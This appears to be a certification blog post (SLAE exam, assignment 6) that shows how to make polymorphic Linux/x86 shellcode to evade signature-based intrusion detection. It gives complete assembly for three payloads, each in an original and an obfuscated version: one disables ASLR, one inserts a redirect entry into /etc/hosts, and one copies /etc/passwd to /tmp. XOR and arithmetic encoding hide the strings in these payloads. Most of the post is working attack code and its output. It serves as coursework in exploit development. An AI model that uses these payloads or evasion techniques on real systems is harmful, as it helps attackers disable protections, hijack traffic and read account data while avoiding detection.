---
title: 'SLAE: Polymorphic Shellcodes (Linux/x86)'
categories:
- Certifications
---
Question: How can signature-based Intrusion Detection systems be defeated? Answer: Using polymorphic shellcodes! This might sound really crazy and cyber, but it has nothing to do with inventing fancy new hacking techniques, it's rather about puzzling. By replacing assembly instructions with other assembly instructions the original functionality is kept intact and signature-based systems are defeated. For example, the following assembly code snippet should give you an idea of what this means:

{% highlight assembly %}
mov eax, 0x2
{% endhighlight %}

This simply moves the value 0x2 into eax. Exactly the same functionality could be achieved by using:

{% highlight assembly %}
xor eax, eax
add al, 0x2
{% endhighlight %}

or by using:

{% highlight assembly %}
xor ebx,ebx
inc ebx
inc ebx
xchg eax,ebx
{% endhighlight %}

All examples have in common that in the end 0x2 is put into EAX. It's the very same functionality with completely different assembly instructions, and this is called a polymorphic shellcode.

Of course there are hundreds of different assembly instructions you could combine to reach the same functionality, and this is what makes the life of IDS/IPS systems really hard. In theory (in a signature-based system), you need to keep samples (or signatures) of many different mutated shellcode versions, just to match one single functionality. Since this is nearly impossible, polymorphic shellcode is used often by attackers to bypass such systems. However many vendors have introduced special heuristics watching the behavior of a shellcode, which is even harder to bypass, but not part of this blog article.

This blog post number 6 as part of my SecurityTube SLAE exam covers creating polymorphic shellcodes. The task is to:

*   Take 3 shellcodes from [www.shell-storm.org](http://www.shell-storm.org) and create polymorphic versions of them
*   The polymorphic versions must not exceed the size of 150% of the original shellcode
*   Bonus: Reducing the size of the polymorphic version in comparison to the original shellcode results in bonus points

**Spoiler: I have met all requirements and the bonus  ;-)**

Short note: Before digging into these shellcodes, I need to mention that many shellcodes on [shell-storm.org](http://shell-storm.org/shellcode/) are documented using AT&T assembly syntax, and since I don't like the AT&T syntax that much, I am using the following commands to convert it to Intel syntax:

{% highlight bash %}
perl -e 'print "{shellcode}"' > shellcode
ndisasm -b 32 shellcode | sed -e 's/^.\{,28\}//'
{% endhighlight %}

Another short note: I have commented my polymorphic shellcodes inline, because  think this help to understand the mutations.

### Shellcode #1: Linux/x86 ASLR deactivation - 83 bytes

The [first shellcode](http://shell-storm.org/shellcode/files/shellcode-813.php) by Jean Pascal Pereira is about the deactivation of Address Space Layer Randomization on Linux. ASLR is used to reduce the attack likelihood by randomizing memory addresses and can be queried and configured using /proc/sys/kernel/randomize_va_space. The default setting on my latest Ubuntu test VM is "2", which means that positions of the stack, VDSO, shared memory regions and the data segment gets randomized:

[![slae-6_shellcode813-0]({{ site.baseurl }}/assets/slae-6_shellcode813-0.png)]({{ site.baseurl }}/assets/slae-6_shellcode813-0.png)

To (temporarily) disable ASLR and therefore probably increase the success likelihood of other exploits, all an attacker has to do is setting this to "0", and this is exactly what this shellcode is doing. Please note that you need root privileges to successfully execute this shellcode!

So the original shellcode converted to Intel syntax looks like this:

{% highlight assembly %}
xor eax,eax
push eax
push dword 0x65636170
push dword 0x735f6176
push dword 0x5f657a69
push dword 0x6d6f646e
push dword 0x61722f6c
push dword 0x656e7265
push dword 0x6b2f7379
push dword 0x732f636f
push dword 0x72702f2f
mov ebx,esp
mov cx,0x2bc
mov al,0x8
int 0x80
mov ebx,eax
push eax
mov dx,0x3a30
push dx
mov ecx,esp
xor edx,edx
inc edx
mov al,0x4
int 0x80
mov al,0x6
int 0x80
inc eax
int 0x80
{% endhighlight %}

My basic idea of the first polymorphic shellcode was to primarily obfuscate the string part "/proc/sys/kernel/randomize_va_space" of the shellcode by XORing it:

{% highlight assembly %}
; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part1
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  https://www.rcesecurity.com 

global _start			

section .text
_start:
	xor eax, eax
	add eax, 0x25 		;length of payload +1 to keep decrementing loop working

	;push eax

	;Let's XOR encode the payload with 0xab

	;push dword 0x65636170
	push dword 0xcec8cadb
	;push dword 0x735f6176
	push dword 0xd8f4cadd
	;push dword 0x5f657a69
	push dword 0xf4ced1c2
	;push dword 0x6d6f646e
	push dword 0xc6c4cfc5
	;push dword 0x61722f6c
	push dword 0xcad984c7
	;push dword 0x656e7265
	push dword 0xcec5d9ce
	;push dword 0x6b2f7379
	push dword 0xc084d8d2
	;push dword 0x732f636f
	push dword 0xd884c8c4
	;push dword 0x72702f2f
	push dword 0xd9db8484

	;and decode it on the stack using a decrementing loop to get 0x0 into EAX
	loop0:
		dec al
		mov cl,[esp+eax]
		xor cl,0xab
		mov [esp+eax],cl
		cmp al, ah
	jne loop0

	mov [esp+0x24], eax 	;replaces the "push eax" instruction from the beginning

	mov ebx,esp
	;mov cx,0x2bc
	sub cx,0xcc73 		;since cl contains 0x2f from the decoding, subtracting  0xcc73 results in 0x2bc
	;mov al,0x8
	add al, 0x8 		;eax is 0x0, so adding 0x8 to get the next syscall (sys_creat)
	int 0x80

	mov ebx,eax
	push eax
	;mov dx,0x3a30
	mov dx, 0x1111
	add dx, 0x291f 		;a simple addition to get 0x3a30 into dx
	push dx
	mov ecx,esp
	;xor edx,edx
	mov edx,[esp+0x2a] 	;use 0-bytes from the payload instead of using xor for termination
	inc edx
	;mov al,0x4
	imul eax, edx, 0x4 	;multiply edx with 0x4 to get next syscall (sys_write)
	int 0x80

	;mov al,0x6
	imul eax, edx, 0x6 	;multiply edx with 0x4 to get next syscall (sys_close)
	int 0x80

	inc eax
	int 0x80
{% endhighlight %}

When my shellcode is executed, ASLR is successfully deactivated:

[![slae-6_shellcode813-1]({{ site.baseurl }}/assets/slae-6_shellcode813-1.png)]({{ site.baseurl }}/assets/slae-6_shellcode813-1.png)

The size of the original shellcode is 83 bytes, my polymorphic version is 114 bytes, which means an **increase by ~38%**.

### Linux/x86 - Add map in /etc/hosts file - 77 bytes

The [second shellcode](http://shell-storm.org/shellcode/files/shellcode-893.php) by Javier Tejedor is about adding a newline to /etc/hosts, which makes it possible to e.g. redirect traffic. The original shellcode adds the entry "127.1.1.1 google.com" to the hosts file:

{% highlight bash %}
global _start

section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     ;/etc///hosts
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       ;permmisions
    int 0x80        ;syscall to open file

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    pop ecx
    push 20         ;length of the string, dont forget to modify if changes the map
    pop edx
    int 0x80        ;syscall to write in the file

    push 0x6
    pop eax
    int 0x80        ;syscall to close the file

    push 0x1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"{% endhighlight %}

The main idea of my polymorphic version is to obfuscate the hosts entry by subtracting 0x10 from each byte :

{% highlight assembly %}
; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part2
; Original: http://shell-storm.org/shellcode/files/shellcode-893.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  https://www.rcesecurity.com 

global _start

section .text

_start:
    	;xor ecx, ecx
    	xor eax, eax		;use eax instead of ecx	

    	;mul ecx
    	cdq			;clear out edx

    	;mov al, 0x5   		
    	add al,0x5		;replace mov by add, since eax is 0x0

    	;push ecx
    	push edx

    	;push 0x7374736f     	;/etc///hosts
    	mov esi, 0x10101010	;encode target file by subtracting 0x10 on each byte
    	mov ecx, 0x6364635f	;minus 0x10 one each byte to encode the payload
    	add ecx, esi		;add 0x10 again on the stack
    	push ecx

    	;push 0x682f2f2f	
    	mov ecx, 0x581f1f1f	;minus 0x10 on each byte
    	add ecx, esi		;add 0x10 on each byte
    	push ecx

    	;push 0x6374652f
    	mov ecx, 0x5364551f	;minus 0x10 on each byte
    	add ecx, esi		;add 0x10 on each byte
    	push ecx

    	mov ebx, esp

    	xchg ecx, edx		;mov 0x0 into ecx
    	mov cx, 0x401       	;permmisions
    	int 0x80        	;syscall sys_open

    	xchg eax, ebx
    	push 0x4
    	pop eax
    	jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
    	pop ecx
    	mov dword [ecx], 0x2e373231 	;replace db string on the fly
    	mov dword [ecx+4], 0x2e312e31   ;replace db string on the fly
    	mov byte [ecx+8], 0x32

    	;push 20        ;length of the string, dont forget to modify if changes the map
    	push len	;moved from static length to dynamic via equ
    	pop edx
    	int 0x80        ;syscall to write in the file (sys_write)

    	push 0x6
    	pop eax	
    	int 0x80        ;syscall to close the file (sys_close)

    	push 0x1
    	pop eax
    	int 0x80        ;syscall to exit (sys_exit)

_load_data:
    	call _write
    	;google db "127.1.1.2 google.com"
    	google db "xxxxx.x.x google.com"	;x to be replaced on the fly :)
    	len:    equ $-google
{% endhighlight %}

When my shellcode is executed, the new entry is successfully added to /etc/hosts:

[![slae6_shellcode893-1]({{ site.baseurl }}/assets/slae6_shellcode893-1.png)]({{ site.baseurl }}/assets/slae6_shellcode893-1.png)

The size of the original shellcode is 77 bytes, my polymorphic version is 109 bytes, which means an **increase by ~42%.**

### Linux/x86 - Copy /etc/passwd to /tmp/outfile (97 bytes)

The [third shellcode](http://shell-storm.org/shellcode/files/shellcode-864.php) by Paolo Stivanin is about copying the /etc/passwd file to /tmp/outfile, which could be useful for an attcker if the /etc/passwd is not directly accessible because it is e.g. protected by a sandbox:

{% highlight assembly %}
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80
{% endhighlight %}

The main idea of my last polymorphic version is to reduce the size of the resulting shellcode by simply mixing up push instructions, which are responsible for the payload:

{% highlight assembly %}
; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part3
; Original: http://shell-storm.org/shellcode/files/shellcode-864.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  https://www.rcesecurity.com 

global _start

section .text

_start:
    	;xor eax,eax
	xor ecx,ecx
    	push ecx		;mixing things up
    	push 0x64777373 	;mixing things up by spreading push instructions
	mul ecx			;clear out eax
	;push 0x61702f63
    	push 0x61702f2f		;mixing things up & move 0x2f to get /etc//passwd instead of //etc/passwd
    	;mov al,0x5
	add al,0x5		;add 0x5 to eax for syscall (sys_open)
    	;xor ecx,ecx
	;push 0x74652f2f
    	push 0x6374652f		
    	;lea ebx,[esp +1]	;this saves some bytes :)
	mov ebx,esp
    	int 0x80

    	mov ebx,eax
    	mov al,0x3		;syscall sys_read
    	mov edi,esp
    	mov ecx,edi
    	;push WORD 0xffff
    	;pop edx
	cdq			;eax sign bit = 0 (likely), so edx is set to 0x0 too
	dec dx			;to get 0xffff into edx, dec dx will happily do the job
    	int 0x80
	mov esi,eax

    	push 0x5		;syscall sys_open
    	pop eax
    	;xor ecx,ecx
    	;push ecx
	inc dx			;set edx to 0x0 again
	push edx
    	push 0x656c6966
    	push 0x74756f2f
    	push 0x706d742f
    	mov ebx,esp	
	xchg ecx,edx		;since edx is used (instead of ecx) to push 0x0 onto the stack
	mov cl,0102o
    	;push WORD 0644o
    	;pop edx
	imul edx,ecx,0x6	;get 0644o aka 0x1a4 into edx
	add edx, 0x18		;get 0644o aka 0x1a4 into edx
    	int 0x80

    	mov ebx,eax
    	;push 0x4
    	;pop eax
	mov al,0x4		;get next syscall into eax (sys_write)
    	mov ecx,edi
    	;mov edx,esi
	xchg edx,esi		;just another way
    	int 0x80

    	;xor eax,eax
    	xor ebx,ebx		;clear ebx
	mul ebx			;clear eax
    	;mov al,0x1
	inc eax			;set syscall to 0x1 (sys_exit)
    	mov bl,0x5
    	int 0x80
{% endhighlight %}

When my shellcode is executed, the passwd is successfully copied to /tmp/outfile:

[![slae6_shellcode864-1]({{ site.baseurl }}/assets/slae6_shellcode864-1.png)]({{ site.baseurl }}/assets/slae6_shellcode864-1.png)

The size of the original shellcode is 97 bytes, my polymorphic version is 95 bytes, which means an **decrease by ~2%!**

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[<span style="color: #2f2f2f;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</span>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE- 497
